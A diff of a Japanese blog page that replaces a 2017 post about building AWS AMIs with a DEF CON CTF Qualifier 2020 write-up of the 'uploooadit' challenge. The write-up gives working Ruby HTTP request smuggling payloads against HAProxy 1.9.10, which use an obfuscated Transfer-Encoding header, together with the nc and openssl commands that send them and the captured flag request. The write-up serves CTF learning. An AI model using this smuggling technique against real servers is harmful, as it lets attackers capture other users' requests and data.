@@ -4,7 +4,7 @@
     <head>
         
             
-                <title>AWSのAMIをゼロから作る autoknitterの紹介</title>
+                <title>DEF CON CTF Qualifier 2020 uploooadit WriteUp</title>
             
         
 
@@ -29,20 +29,20 @@
 
 
 
-<meta name="twitter:text:title" content="AWSのAMIをゼロから作る autoknitterの紹介"/>
-<meta name="twitter:title" content="AWSのAMIをゼロから作る autoknitterの紹介"/>
-<meta name="twitter:description" content="TL; DR AWSでは自分で作成したAMIを使いたい。 PackerのEBS Surrogate Builderを使うと便利にAMIを作成できる。 EBS Surrogate Builderをより"/>
+<meta name="twitter:text:title" content="DEF CON CTF Qualifier 2020 uploooadit WriteUp"/>
+<meta name="twitter:title" content="DEF CON CTF Qualifier 2020 uploooadit WriteUp"/>
+<meta name="twitter:description" content="2020/05/16 ~ 2020/05/18 に開催されたDEF CON CTF Qualifier 2020に参加して、 welcome-to-dc2020-quals, welcome-video, uploooaditの3問をときました。 最初の2つはチュートリアルなので割愛して、up"/>
 <meta name="twitter:site" content="@s_tajima"/>
 
-        <meta property="og:title" content="AWSのAMIをゼロから作る autoknitterの紹介" />
-<meta property="og:description" content="TL; DR AWSでは自分で作成したAMIを使いたい。 PackerのEBS Surrogate Builderを使うと便利にAMIを作成できる。 EBS Surrogate Builderをより" />
+        <meta property="og:title" content="DEF CON CTF Qualifier 2020 uploooadit WriteUp" />
+<meta property="og:description" content="2020/05/16 ~ 2020/05/18 に開催されたDEF CON CTF Qualifier 2020に参加して、 welcome-to-dc2020-quals, welcome-video, uploooaditの3問をときました。 最初の2つはチュートリアルなので割愛して、up" />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="https://blog.s-tajima.work/post/2017/intro-autoknitter/" />
+<meta property="og:url" content="https://blog.s-tajima.work/post/2020/dc28-quals-uploooadit-write-up/" />
 
 
 
-<meta property="article:published_time" content="2017-05-11T23:21:25&#43;09:00"/>
-<meta property="article:modified_time" content="2017-05-11T23:21:25&#43;09:00"/>
+<meta property="article:published_time" content="2020-05-18T23:00:00&#43;09:00"/>
+<meta property="article:modified_time" content="2020-05-18T23:00:00&#43;09:00"/>
 
 
 
@@ -55,12 +55,12 @@
 
 
         
-<meta itemprop="name" content="AWSのAMIをゼロから作る autoknitterの紹介">
-<meta itemprop="description" content="TL; DR AWSでは自分で作成したAMIを使いたい。 PackerのEBS Surrogate Builderを使うと便利にAMIを作成できる。 EBS Surrogate Builderをより">
+<meta itemprop="name" content="DEF CON CTF Qualifier 2020 uploooadit WriteUp">
+<meta itemprop="description" content="2020/05/16 ~ 2020/05/18 に開催されたDEF CON CTF Qualifier 2020に参加して、 welcome-to-dc2020-quals, welcome-video, uploooaditの3問をときました。 最初の2つはチュートリアルなので割愛して、up">
 
 
-<meta itemprop="dateModified" content="2017-05-11T23:21:25&#43;09:00" />
-<meta itemprop="wordCount" content="1554">
+<meta itemprop="dateModified" content="2020-05-18T23:00:00&#43;09:00" />
+<meta itemprop="wordCount" content="1236">
 
 
 
@@ -231,43 +231,43 @@ ga('send', 'pageview');
             
 
 
-<li><a href="//twitter.com/share?url=https%3a%2f%2fblog.s-tajima.work%2fpost%2f2017%2fintro-autoknitter%2f&text=AWS%e3%81%aeAMI%e3%82%92%e3%82%bc%e3%83%ad%e3%81%8b%e3%82%89%e4%bd%9c%e3%82%8b%20autoknitter%e3%81%ae%e7%b4%b9%e4%bb%8b&via=s_tajima" target="_blank" class="share-btn twitter">
+<li><a href="//twitter.com/share?url=https%3a%2f%2fblog.s-tajima.work%2fpost%2f2020%2fdc28-quals-uploooadit-write-up%2f&text=DEF%20CON%20CTF%20Qualifier%202020%20uploooadit%20WriteUp&via=s_tajima" target="_blank" class="share-btn twitter">
     <i class="fa fa-twitter"></i>
     <p>Twitter</p>
 </a></li>
 
 
-<li><a href="//plus.google.com/share?url=https%3a%2f%2fblog.s-tajima.work%2fpost%2f2017%2fintro-autoknitter%2f" target="_blank" class="share-btn google-plus">
+<li><a href="//plus.google.com/share?url=https%3a%2f%2fblog.s-tajima.work%2fpost%2f2020%2fdc28-quals-uploooadit-write-up%2f" target="_blank" class="share-btn google-plus">
     <i class="fa fa-google-plus"></i>
     <p>Google+</p>
 </a></li>
 
 
-<li><a href="//www.facebook.com/sharer/sharer.php?u=https%3a%2f%2fblog.s-tajima.work%2fpost%2f2017%2fintro-autoknitter%2f" target="_blank" class="share-btn facebook">
+<li><a href="//www.facebook.com/sharer/sharer.php?u=https%3a%2f%2fblog.s-tajima.work%2fpost%2f2020%2fdc28-quals-uploooadit-write-up%2f" target="_blank" class="share-btn facebook">
     <i class="fa fa-facebook"></i>
     <p>Facebook</p>
 </a></li>
 
 
-<li><a href="//reddit.com/submit?url=https%3a%2f%2fblog.s-tajima.work%2fpost%2f2017%2fintro-autoknitter%2f&title=AWS%e3%81%aeAMI%e3%82%92%e3%82%bc%e3%83%ad%e3%81%8b%e3%82%89%e4%bd%9c%e3%82%8b%20autoknitter%e3%81%ae%e7%b4%b9%e4%bb%8b" target="_blank" class="share-btn reddit">
+<li><a href="//reddit.com/submit?url=https%3a%2f%2fblog.s-tajima.work%2fpost%2f2020%2fdc28-quals-uploooadit-write-up%2f&title=DEF%20CON%20CTF%20Qualifier%202020%20uploooadit%20WriteUp" target="_blank" class="share-btn reddit">
     <i class="fa fa-reddit-alien"></i>
     <p>Reddit</p>
 </a></li>
 
 
-<li><a href="//www.linkedin.com/shareArticle?url=https%3a%2f%2fblog.s-tajima.work%2fpost%2f2017%2fintro-autoknitter%2f&title=AWS%e3%81%aeAMI%e3%82%92%e3%82%bc%e3%83%ad%e3%81%8b%e3%82%89%e4%bd%9c%e3%82%8b%20autoknitter%e3%81%ae%e7%b4%b9%e4%bb%8b" target="_blank" class="share-btn linkedin">
+<li><a href="//www.linkedin.com/shareArticle?url=https%3a%2f%2fblog.s-tajima.work%2fpost%2f2020%2fdc28-quals-uploooadit-write-up%2f&title=DEF%20CON%20CTF%20Qualifier%202020%20uploooadit%20WriteUp" target="_blank" class="share-btn linkedin">
     <i class="fa fa-linkedin"></i>
     <p>LinkedIn</p>
 </a></li>
 
 
-<li><a href="//www.stumbleupon.com/submit?url=https%3a%2f%2fblog.s-tajima.work%2fpost%2f2017%2fintro-autoknitter%2f&title=AWS%e3%81%aeAMI%e3%82%92%e3%82%bc%e3%83%ad%e3%81%8b%e3%82%89%e4%bd%9c%e3%82%8b%20autoknitter%e3%81%ae%e7%b4%b9%e4%bb%8b" target="_blank" class="share-btn stumbleupon">
+<li><a href="//www.stumbleupon.com/submit?url=https%3a%2f%2fblog.s-tajima.work%2fpost%2f2020%2fdc28-quals-uploooadit-write-up%2f&title=DEF%20CON%20CTF%20Qualifier%202020%20uploooadit%20WriteUp" target="_blank" class="share-btn stumbleupon">
     <i class="fa fa-stumbleupon"></i>
     <p>StumbleUpon</p>
 </a></li>
 
 
-<li><a href="mailto:?subject=Check out this post by Satoshi%20Tajima&body=https%3a%2f%2fblog.s-tajima.work%2fpost%2f2017%2fintro-autoknitter%2f" target="_blank" class="share-btn email">
+<li><a href="mailto:?subject=Check out this post by Satoshi%20Tajima&body=https%3a%2f%2fblog.s-tajima.work%2fpost%2f2020%2fdc28-quals-uploooadit-write-up%2f" target="_blank" class="share-btn email">
     <i class="fa fa-envelope"></i>
     <p>Email</p>
 </a></li>
@@ -284,7 +284,7 @@ ga('send', 'pageview');
     <header>
     <div class="title">
         
-            <h1><a href="https://blog.s-tajima.work/post/2017/intro-autoknitter/">AWSのAMIをゼロから作る autoknitterの紹介</a></h1>
+            <h1><a href="https://blog.s-tajima.work/post/2020/dc28-quals-uploooadit-write-up/">DEF CON CTF Qualifier 2020 uploooadit WriteUp</a></h1>
             
         
         
@@ -295,8 +295,8 @@ ga('send', 'pageview');
         
 
         <time class="published"
-            datetime='2017-05-11'>
-            May 11, 2017</time>
+            datetime='2020-05-18'>
+            May 18, 2020</time>
         <span class="author">Satoshi Tajima</span>
         
         
@@ -309,113 +309,170 @@ ga('send', 'pageview');
     <div id="content">
         
 
-<h1 id="tl-dr">TL; DR</h1>
+<p>2020/05/16 ~ 2020/05/18 に開催されたDEF CON CTF Qualifier 2020に参加して、<br />
+welcome-to-dc2020-quals, welcome-video, uploooaditの3問をときました。</p>
+
+<p>最初の2つはチュートリアルなので割愛して、uploooaditのWriteUpを書きます。</p>
+
+<h1 id="ソースコードを確認">ソースコードを確認</h1>
 
 <ul>
-<li>AWSでは自分で作成したAMIを使いたい。</li>
-<li>PackerのEBS Surrogate Builderを使うと便利にAMIを作成できる。</li>
-<li>EBS Surrogate Builderをより簡単に使えるように autoknitter という参照実行を公開した。</li>
-</ul>
-
-<h1 id="背景">背景</h1>
-
-<p>AWSのEC2を使う上で、どのAMIを利用するかというのはとても重要な選択の1つです。</p>
-
-<p>細かい選択肢は色々ありますが、大きく分けると</p>
-
-<ol>
-<li>Community AMIsにて提供されているAMIを利用する</li>
-<li>AWS Marketplaceにて提供されているAMIを利用する</li>
-<li>自分たちでAMIを作成する</li>
-</ol>
-
-<p>というパターンがあると思います。</p>
-
-<p>AWSへのロックインを避けたい、 AWS以外の環境でも同じOSを利用したいといった要件から、CentOSを利用したい場合を考えてみます。</p>
-
-<p>まず、1のCommunity AMIsで CentOS を検索してみます。</p>
-
-<p><img src="/post/2017/intro-autoknitter/choose-ami-community.png" alt="choose-ami-community" /></p>
-
-<p>このようにたくさんのAMIが出てきます。<br />
-しかし、基本的にはこれらは <em>だれが作ったのか</em> も <em>どうやって作ったのか</em> もわからないAMIです。
-悪意のあるAMIが公開されていない保証がないため使うにはリスクが伴います。</p>
-
-<p>AWSとしてもこのような <a href="http://docs.aws.amazon.com/AWSEC2/latest/UserGuide/building-shared-amis.html">ガイドライン</a> を公開していますが、個人的には利用は避けたいところです。</p>
-
-<p>次に、2のAWS Marketplaceにて CentOS を検索してみます。</p>
-
-<p><img src="/post/2017/intro-autoknitter/choose-ami-marketplace.png" alt="choose-ami-marketplace" /></p>
-
-<p>こちらもいくつかのAMIが出てきます。<br />
-今度は Centos.org が提供するAMIも出てきました。
-Centos.org が提供するAMIであれば、Community AMIsの時のようなリスクは伴わないと考えてもよさそうです。
-しかしこれを利用するには注意が必要で、このAMIから作成されたEBSはRoot Volumeとして以外はアタッチできないという制限を受けることになります。</p>
-
-<p>サポートケースを起票すればその制限を解除してもらうこともできるようですが、障害対応時等、緊急度の高いときにはそんな余裕がないこともありそうなのでこの選択肢も避けたいところです。</p>
-
-<p>参考: <a href="https://www.quora.com/Amazon-EC2/Amazon-EC2-Is-it-possible-to-rescue-an-EBS-volume-which-has-marketplace-codes">https://www.quora.com/Amazon-EC2/Amazon-EC2-Is-it-possible-to-rescue-an-EBS-volume-which-has-marketplace-codes</a></p>
-
-<p>最後の手段として、3の通り自分たちでAMIをビルドすることになります。</p>
-
-<h1 id="packer-ebs-surrogate-builderの紹介">Packer, EBS Surrogate Builderの紹介</h1>
-
-<p><a href="https://www.packer.io/">Packer</a> には、AWSのAMIを作成するためのBuilderが実装されています。</p>
-
-<p><a href="https://www.packer.io/docs/builders/amazon.html">Amazon AMI Builder</a> に記載されている通り、そのためのBuilderは複数用意されているのですが、
-今回はその中でも <a href="https://www.packer.io/docs/builders/amazon-ebssurrogate.html">EBS Surrogate Builder</a> を利用してAMIを作成します。</p>
-
-<p>EBS Surrogate BuilderによるAMI作成の仕組みについて説明します。</p>
-
-<p><img src="/post/2017/intro-autoknitter/amazon-ebssurrogate.png" alt="amazon-ebssurrogate.png" /></p>
-
-<ol>
-<li>まずAMI構築の作業用インスタンス(Source Instance)が起動されます。</li>
-<li>Source Instanceにアタッチされた、AMIのルートボリュームとして利用するEBS(AMI Root Device)に対して、OSのイメージを書き込みます。</li>
-<li>AMI Root Deviceのスナップショットを作成し、そのスナップショットからAMIを作成します。</li>
-</ol>
-
-<p>EBS Surrogate Builderを使うことで、</p>
+<li>Flaskで書かれたPythonのWebアプリケーション</li>
+<li>エンドポイントは以下の3つ
 
 <ul>
-<li>AMI作成の手順をコードで記述することで、自動化され再現性のある状態になる。</li>
-<li>元となるAMIを必要とせず、空のEBSからAMIを作成できる。</li>
-<li>作業用のインスタンスを毎回自動起動/ターミネートできる。</li>
+<li>GET / &hellip; 空のページです。</li>
+<li>POST /files/ &hellip; X-guidというリクエストヘッダに記載された文字列の通りのパスにファイルを保存します。</li>
+<li>GET /files/ &hellip; POST /files/ でアップロードしたファイルのコンテンツを返します。</li>
+</ul></li>
 </ul>
 
-<p>といった条件でAMIを作成することができます。</p>
+<h1 id="稼働環境を確認">稼働環境を確認</h1>
 
-<p>EBS Surrogate Builderはとても便利な手段なのですが、AMI Root Deviceに対してOSのイメージを書き込むための手順を実装するのが一番の手間になります。</p>
+<p>普通にリクエストを投げてみて、HAProxy + gunicorn/20.0.0の構成ということがわかります。</p>
 
-<h1 id="autoknitter">autoknitter</h1>
-
-<p>EBS Surrogate Builderをより簡単に使えるように、autoknitterというリポジトリを公開しました。</p>
-
-<p><a href="https://github.com/s-tajima/autoknitter">https://github.com/s-tajima/autoknitter</a></p>
-
-<p>autoknitterはPackerのEBS Surrogate Builderを利用するための参考実装です。
-セットアップ後、このように <code>make build</code> するだけでAMIが作成できるようになっています。</p>
-
-<pre><code class="language-text">$ make build
-./bin/packer build \
-	-var-file ./variables.json \
-	-var-file ./resources/centos/6.9/variables.json \
-	./template.json
-amazon-ebssurrogate output will be in this color.
-
-==&gt; amazon-ebssurrogate: Prevalidating AMI Name...
-
+<pre><code>$ curl -sv https://uploooadit.oooverflow.io/
 .. snip ..
-
-Build 'amazon-ebssurrogate' finished.
-
-==&gt; Builds finished. The artifacts of successful builds are:
---&gt; amazon-ebssurrogate: AMIs were created:
-
-ap-northeast-1: ami-XXXXXXXX
+&lt; HTTP/1.1 204 NO CONTENT
+&lt; Server: gunicorn/20.0.0
+&lt; Date: Sat, 16 May 2020 13:05:18 GMT
+&lt; Content-Type: text/html; charset=utf-8
+&lt; Via: haproxy
+.. snip ..
 </code></pre>
 
-<p>現在対応しているディストリビューションはCentOS 6.9のみですが、今後色々なバリエーションを増やしていく予定です。</p>
+<p>今度はエラーになるようなリクエストを投げてみて、HAProxyのバージョンは1.9.10ということがわかります。<br />
+<a href="https://www.haproxy.org/download/1.9/src/CHANGELOG">https://www.haproxy.org/download/1.9/src/CHANGELOG</a> を見ると、2019/08/08のリリースと若干古いのが気になります。。</p>
+
+<pre><code>$ curl -sv https://uploooadit.oooverflow.io/あ
+&lt; HTTP/1.0 400 Bad request
+&lt; Server: haproxy 1.9.10
+&lt; Cache-Control: no-cache
+&lt; Connection: close
+&lt; Content-Type: text/html
+&lt;
+&lt;html&gt;&lt;body&gt;&lt;h1&gt;400 Bad request&lt;/h1&gt;
+Your browser sent an invalid request.
+&lt;/body&gt;&lt;/html&gt;
+.. snip ..
+</code></pre>
+
+<p>SSRFやHTTP request smuggling的あたりができるのではと疑い、
+調べてみると HAProxy の HTTP request smuggling というそのまんまの記事が見つかります。</p>
+
+<ul>
+<li><a href="https://nathandavison.com/blog/haproxy-http-request-smuggling">https://nathandavison.com/blog/haproxy-http-request-smuggling</a></li>
+<li><a href="https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn">https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn</a></li>
+</ul>
+
+<p>この時点でこんな仮設をたてました。</p>
+
+<ul>
+<li>フラグが含まれたObjectに対するアクセス、ないしはフラグをアップロードするアクセスが、定常的にリクエストされている。</li>
+<li>HTTP request smugglingによって、そのアクセスの内容を盗み取る必要がある。</li>
+</ul>
+
+<h1 id="ローカルで検証環境の作成">ローカルで検証環境の作成</h1>
+
+<p>適当に立ち上げたEC2上に&hellip;</p>
+
+<ul>
+<li>HAProxyの1.9.10を用意 (ソースコードからコンパイル)</li>
+<li>gunicornを用意 (pipでインストール)</li>
+<li>提供された app.py, store.py を使用 (S3StoreはLocalStoreに切り替え)</li>
+</ul>
+
+<p>という形で環境をつくります。</p>
+
+<p>そして、まずはRubyでこんなPayloadを作成。</p>
+
+<ul>
+<li>payload.rb</li>
+</ul>
+
+<pre><code>payload = &lt;&lt;EOP
+POST /files/ HTTP/1.1\r
+Host: uploooadit.oooverflow.io\r
+X-guid: 11111111-2222-3333-1111-111111111112\r
+Content-Type: text/plain\r
+Content-Length: 4\r
+\r
+test\r
+
+EOP
+print payload 
+</code></pre>
+
+<p>こんな形でトライ&amp; エラーを繰り返せる状態を作ります。</p>
+
+<pre><code>$ ruby payload.rb | nc localhost 1080
+</code></pre>
+
+<p>tcpdumpも使い、パケットを見ながら調整していくと、こんな形でうまくいきそうなことがわかります。</p>
+
+<ul>
+<li>payload.rb</li>
+</ul>
+
+<pre><code>payload = &lt;&lt;EOP.chomp
+POST /files/ HTTP/1.1\r
+Host: uploooadit.oooverflow.io\r
+X-guid: 11111111-2222-3333-1111-111111111112\r
+Content-Type: text/plain\r
+Content-Length: 158\r
+Transfer-Encoding: \x0bchunked\r
+\r
+0\r
+\r
+POST /files/ HTTP/1.1\r
+Host: uploooadit.oooverflow.io\r
+X-guid: 11111111-2222-3333-1111-111111111119\r
+Content-Type: text/plain\r
+Content-Length: 388\r
+\r
+test
+EOP
+
+print payload 
+sleep(10)
+</code></pre>
+
+<ul>
+<li>コマンド</li>
+</ul>
+
+<pre><code class="language-bash">$ unbuffer ruby payload.rb | nc localhost 1080
+$ curl http://localhost:1080/files/11111111-2222-3333-1111-111111111119
+</code></pre>
+
+<h1 id="実環境でのトライ">実環境でのトライ</h1>
+
+<p>実際の環境はhttpsなので、ncをopenssl s_clientにし、かつ Content-Length も調整していき&hellip;<br />
+最終的に以下のようなコマンドにてリクエストを盗み見ることに成功。</p>
+
+<pre><code class="language-bash">$ unbuffer ruby payload.rb | openssl s_client -connect uploooadit.oooverflow.io:443
+$ curl http://localhost:1080/files/11111111-2222-3333-1111-111111111119
+</code></pre>
+
+<p>リクエストのBodyにFLAGがありました。</p>
+
+<pre><code>tesPOST /files/ HTTP/1.1
+Host: 127.0.0.1:8080
+User-Agent: invoker
+Accept-Encoding: gzip, deflate
+Accept: */*
+Content-Type: text/plain
+X-guid: 85a290de-9877-4d90-82ea-fe0700a570b0
+Content-Length: 152
+X-Forwarded-For: 127.0.0.1
+
+Congratulations!
+OOO{That girl thinks she's the queen of the neighborhood/She's got the hottest trike in town/That girl, she holds her head up so high}
+</code></pre>
+
+<p>以上、久しぶりに参加したCTFのWriteUpでした。<br />
+いつもCTFは遊び参加で数問見てみて終わりみたいになるんだけど、<br />
+そろそろチームとか組んでがっつり時間確保して上位に入るのを目指すような参加をしたい。</p>
 
     </div>
 
@@ -443,7 +500,7 @@ ap-northeast-1: ami-XXXXXXXX
     
         <li><a href='/categories/ja'>ja</a></li>
     
-        <li><a href='/categories/aws'>aws</a></li>
+        <li><a href='/categories/'></a></li>
     
 </ul>
 
@@ -454,43 +511,43 @@ ap-northeast-1: ami-XXXXXXXX
             
 
 
-<li><a href="//twitter.com/share?url=https%3a%2f%2fblog.s-tajima.work%2fpost%2f2017%2fintro-autoknitter%2f&text=AWS%e3%81%aeAMI%e3%82%92%e3%82%bc%e3%83%ad%e3%81%8b%e3%82%89%e4%bd%9c%e3%82%8b%20autoknitter%e3%81%ae%e7%b4%b9%e4%bb%8b&via=s_tajima" target="_blank" class="share-btn twitter">
+<li><a href="//twitter.com/share?url=https%3a%2f%2fblog.s-tajima.work%2fpost%2f2020%2fdc28-quals-uploooadit-write-up%2f&text=DEF%20CON%20CTF%20Qualifier%202020%20uploooadit%20WriteUp&via=s_tajima" target="_blank" class="share-btn twitter">
     <i class="fa fa-twitter"></i>
     <p>Twitter</p>
 </a></li>
 
 
-<li><a href="//plus.google.com/share?url=https%3a%2f%2fblog.s-tajima.work%2fpost%2f2017%2fintro-autoknitter%2f" target="_blank" class="share-btn google-plus">
+<li><a href="//plus.google.com/share?url=https%3a%2f%2fblog.s-tajima.work%2fpost%2f2020%2fdc28-quals-uploooadit-write-up%2f" target="_blank" class="share-btn google-plus">
     <i class="fa fa-google-plus"></i>
     <p>Google+</p>
 </a></li>
 
 
-<li><a href="//www.facebook.com/sharer/sharer.php?u=https%3a%2f%2fblog.s-tajima.work%2fpost%2f2017%2fintro-autoknitter%2f" target="_blank" class="share-btn facebook">
+<li><a href="//www.facebook.com/sharer/sharer.php?u=https%3a%2f%2fblog.s-tajima.work%2fpost%2f2020%2fdc28-quals-uploooadit-write-up%2f" target="_blank" class="share-btn facebook">
     <i class="fa fa-facebook"></i>
     <p>Facebook</p>
 </a></li>
 
 
-<li><a href="//reddit.com/submit?url=https%3a%2f%2fblog.s-tajima.work%2fpost%2f2017%2fintro-autoknitter%2f&title=AWS%e3%81%aeAMI%e3%82%92%e3%82%bc%e3%83%ad%e3%81%8b%e3%82%89%e4%bd%9c%e3%82%8b%20autoknitter%e3%81%ae%e7%b4%b9%e4%bb%8b" target="_blank" class="share-btn reddit">
+<li><a href="//reddit.com/submit?url=https%3a%2f%2fblog.s-tajima.work%2fpost%2f2020%2fdc28-quals-uploooadit-write-up%2f&title=DEF%20CON%20CTF%20Qualifier%202020%20uploooadit%20WriteUp" target="_blank" class="share-btn reddit">
     <i class="fa fa-reddit-alien"></i>
     <p>Reddit</p>
 </a></li>
 
 
-<li><a href="//www.linkedin.com/shareArticle?url=https%3a%2f%2fblog.s-tajima.work%2fpost%2f2017%2fintro-autoknitter%2f&title=AWS%e3%81%aeAMI%e3%82%92%e3%82%bc%e3%83%ad%e3%81%8b%e3%82%89%e4%bd%9c%e3%82%8b%20autoknitter%e3%81%ae%e7%b4%b9%e4%bb%8b" target="_blank" class="share-btn linkedin">
+<li><a href="//www.linkedin.com/shareArticle?url=https%3a%2f%2fblog.s-tajima.work%2fpost%2f2020%2fdc28-quals-uploooadit-write-up%2f&title=DEF%20CON%20CTF%20Qualifier%202020%20uploooadit%20WriteUp" target="_blank" class="share-btn linkedin">
     <i class="fa fa-linkedin"></i>
     <p>LinkedIn</p>
 </a></li>
 
 
-<li><a href="//www.stumbleupon.com/submit?url=https%3a%2f%2fblog.s-tajima.work%2fpost%2f2017%2fintro-autoknitter%2f&title=AWS%e3%81%aeAMI%e3%82%92%e3%82%bc%e3%83%ad%e3%81%8b%e3%82%89%e4%bd%9c%e3%82%8b%20autoknitter%e3%81%ae%e7%b4%b9%e4%bb%8b" target="_blank" class="share-btn stumbleupon">
+<li><a href="//www.stumbleupon.com/submit?url=https%3a%2f%2fblog.s-tajima.work%2fpost%2f2020%2fdc28-quals-uploooadit-write-up%2f&title=DEF%20CON%20CTF%20Qualifier%202020%20uploooadit%20WriteUp" target="_blank" class="share-btn stumbleupon">
     <i class="fa fa-stumbleupon"></i>
     <p>StumbleUpon</p>
 </a></li>
 
 
-<li><a href="mailto:?subject=Check out this post by Satoshi%20Tajima&body=https%3a%2f%2fblog.s-tajima.work%2fpost%2f2017%2fintro-autoknitter%2f" target="_blank" class="share-btn email">
+<li><a href="mailto:?subject=Check out this post by Satoshi%20Tajima&body=https%3a%2f%2fblog.s-tajima.work%2fpost%2f2020%2fdc28-quals-uploooadit-write-up%2f" target="_blank" class="share-btn email">
     <i class="fa fa-envelope"></i>
     <p>Email</p>
 </a></li>
@@ -500,13 +557,10 @@ ap-northeast-1: ami-XXXXXXXX
 </article>
 <ul class="actions pagination">
     
-        <li><a href="https://blog.s-tajima.work/post/2017/intro-tshark_en/"
-                class="button big previous">Breakdown investigation of network traffic using tshark.</a></li>
+        <li><a href="https://blog.s-tajima.work/post/2019/input-output/"
+                class="button big previous">2019年のインプット・アウトプットまとめ</a></li>
     
 
-    
-        <li><a href="https://blog.s-tajima.work/post/2017/use-slapd-with-auditlog/"
-                class="button big next">CentOSでslapdのauditlogを有効にする</a></li>
     
 </ul>
 
